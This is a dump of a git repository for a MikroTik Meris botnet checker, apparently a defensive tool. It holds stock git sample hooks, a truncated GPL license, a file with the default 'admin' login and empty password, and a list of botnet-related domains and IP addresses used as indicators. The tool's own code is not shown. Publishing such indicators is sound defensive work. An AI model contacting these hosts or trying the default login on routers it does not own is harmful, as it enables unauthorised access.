# Repository Information
Name: mikrotik_meris_checker

# Directory Structure
Directory structure:
└── github_repos/mikrotik_meris_checker/
    │   ├── config
    │   ├── description
    │   ├── HEAD
    │   ├── hooks/
    │   │   ├── applypatch-msg.sample
    │   │   ├── commit-msg.sample
    │   │   ├── fsmonitor-watchman.sample
    │   │   ├── post-update.sample
    │   │   ├── pre-applypatch.sample
    │   │   ├── pre-commit.sample
    │   │   ├── pre-merge-commit.sample
    │   │   ├── pre-push.sample
    │   │   ├── pre-rebase.sample
    │   │   ├── pre-receive.sample
    │   │   ├── prepare-commit-msg.sample
    │   │   ├── push-to-checkout.sample
    │   │   └── update.sample
    │   ├── index
    │   ├── info/
    │   │   └── exclude
    │   ├── logs/
    │   │   ├── HEAD
    │   │   └── refs/
    │   │       ├── heads/
    │   │       │   └── main
    │   │       └── remotes/
    │   │           └── origin/
    │   │               └── HEAD
    │   ├── objects/
    │   │   ├── info/
    │   │   └── pack/
    │   │       ├── pack-9a3780b2eedab0efb5e97ad6e524a13ff12b0dde.idx
    │   │       └── pack-9a3780b2eedab0efb5e97ad6e524a13ff12b0dde.pack
    │   ├── packed-refs
    │   └── refs/
    │       ├── heads/
    │       │   └── main
    │       ├── remotes/
    │       │   └── origin/
    │       │       └── HEAD
    │       └── tags/
    ├── credentials.txt
    ├── indicators.txt
    ├── LICENSE
    ├── meris_checker.py
    ├── README.md
    ├── req.txt
    ├── stage1_main.cpp
    └── stage2_main.cpp


# Content
File: /.git\config
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://github.com/eclypsium/mikrotik_meris_checker.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main


File: /.git\description
Unnamed repository; edit this file 'description' to name the repository.


File: /.git\HEAD
ref: refs/heads/main


File: /.git\hooks\applypatch-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:


File: /.git\hooks\commit-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}


File: /.git\hooks\fsmonitor-watchman.sample
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
File: /.git\hooks\post-update.sample
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info


File: /.git\hooks\pre-applypatch.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:


File: /.git\hooks\pre-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --


File: /.git\hooks\pre-merge-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:


File: /.git\hooks\pre-push.sample
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local oid> <remote ref> <remote oid>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')

while read local_ref local_oid remote_ref remote_oid
do
	if test "$local_oid" = "$zero"
	then
		# Handle delete
		:
	else
		if test "$remote_oid" = "$zero"
		then
			# New branch, examine all commits
			range="$local_oid"
		else
			# Update to existing branch, examine new commits
			range="$remote_oid..$local_oid"
		fi

		# Check for WIP commit
		commit=$(git rev-list -n 1 --grep '^WIP' "$range")
		if test -n "$commit"
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0


File: /.git\hooks\pre-rebase.sample
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END


File: /.git\hooks\pre-receive.sample
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi


File: /.git\hooks\prepare-commit-msg.sample
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi


File: /.git\hooks\push-to-checkout.sample
#!/bin/sh

# An example hook script to update a checked-out tree on a git push.
#
# This hook is invoked by git-receive-pack(1) when it reacts to git
# push and updates reference(s) in its repository, and when the push
# tries to update the branch that is currently checked out and the
# receive.denyCurrentBranch configuration variable is set to
# updateInstead.
#
# By default, such a push is refused if the working tree and the index
# of the remote repository has any difference from the currently
# checked out commit; when both the working tree and the index match
# the current commit, they are updated to match the newly pushed tip
# of the branch. This hook is to be used to override the default
# behaviour; however the code below reimplements the default behaviour
# as a starting point for convenient modification.
#
# The hook receives the commit with which the tip of the current
# branch is going to be updated:
commit=$1

# It can exit with a non-zero status to refuse the push (when it does
# so, it must not modify the index or the working tree).
die () {
	echo >&2 "$*"
	exit 1
}

# Or it can make any necessary changes to the working tree and to the
# index to bring them to the desired state when the tip of the current
# branch is updated to the new commit, and exit with a zero status.
#
# For example, the hook can simply run git read-tree -u -m HEAD "$1"
# in order to emulate git fetch that is run in the reverse direction
# with git push, as the two-tree form of git read-tree -u -m is
# essentially the same as git switch or git checkout that switches
# branches while keeping the local changes in the working tree that do
# not interfere with the difference between the branches.

# The below is a more-or-less exact translation to shell of the C code
# for the default behaviour for git's push-to-checkout hook defined in
# the push_to_deploy() function in builtin/receive-pack.c.
#
# Note that the hook will be executed from the repository directory,
# not from the working tree, so if you want to perform operations on
# the working tree, you will have to adapt your code accordingly, e.g.
# by adding "cd .." or using relative paths.

if ! git update-index -q --ignore-submodules --refresh
then
	die "Up-to-date check failed"
fi

if ! git diff-files --quiet --ignore-submodules --
then
	die "Working directory has unstaged changes"
fi

# This is a rough translation of:
#
#   head_has_history() ? "HEAD" : EMPTY_TREE_SHA1_HEX
if git cat-file -e HEAD 2>/dev/null
then
	head=HEAD
else
	head=$(git hash-object -t tree --stdin </dev/null)
fi

if ! git diff-index --quiet --cached --ignore-submodules $head --
then
	die "Working directory has staged changes"
fi

if ! git read-tree -u -m "$commit"
then
	die "Could not update working tree to new HEAD"
fi


File: /.git\hooks\update.sample
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0


File: /.git\info\exclude
File: /.git\logs\HEAD
0000000000000000000000000000000000000000 a657f6427992baa6f89e1f704cd2e1719acb0f8f vivek-dodia <vivek.dodia@icloud.com> 1738605803 -0500	clone: from https://github.com/eclypsium/mikrotik_meris_checker.git


File: /.git\logs\refs\heads\main
0000000000000000000000000000000000000000 a657f6427992baa6f89e1f704cd2e1719acb0f8f vivek-dodia <vivek.dodia@icloud.com> 1738605803 -0500	clone: from https://github.com/eclypsium/mikrotik_meris_checker.git


File: /.git\logs\refs\remotes\origin\HEAD
0000000000000000000000000000000000000000 a657f6427992baa6f89e1f704cd2e1719acb0f8f vivek-dodia <vivek.dodia@icloud.com> 1738605803 -0500	clone: from https://github.com/eclypsium/mikrotik_meris_checker.git


File: /.git\packed-refs
# pack-refs with: peeled fully-peeled sorted 
a657f6427992baa6f89e1f704cd2e1719acb0f8f refs/remotes/origin/main


File: /.git\refs\heads\main
a657f6427992baa6f89e1f704cd2e1719acb0f8f


File: /.git\refs\remotes\origin\HEAD
ref: refs/remotes/origin/main


File: /credentials.txt
admin:


File: /indicators.txt
ninhaine.com
2makestorage.com
nisdably.com
iceanedy.com
198.50.252.64
humisnee.com
gomersly.com
hammersd.info
govole.info
yourblog.info
touchook.info
spolaect.info
pioncker.com
fotamene.com
myysuper.com
myfrance.xyz
weirdgames.info
globalmoby.xyz
portgame.website
massgames.space
bestony.club
strtbiz.site
static.14.93.202.116.clients.your-server.de
funtime.best
tik.anyget.ru
takebad1.com
phonemus.net
hitsmoby.com
1awesome.net
7standby.com
audiomain.website
dartspeak.xyz
morefilm.club
spgames.site
eeongous.com
leappoach.info
mythtime.xyz
1abcnews.xyz
ciskotik.com
cloudsond.me
fanmusic.xyz
gamedate.xyz
mobstore.xyz
motinkon.com
my1story.xyz
senourth.com
sitestory.xyz
spacewb.tech
specialword.xyz
tryphptoday.com
wchampmuse.pw
widechanges.best
zancetom.com
bestmade.xyz
gamesone.xyz
mobigifs.xyz
myphotos.xyz
onlinegt.xyz
picsgifs.xyz
cosmosentry.com


File: /LICENSE
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
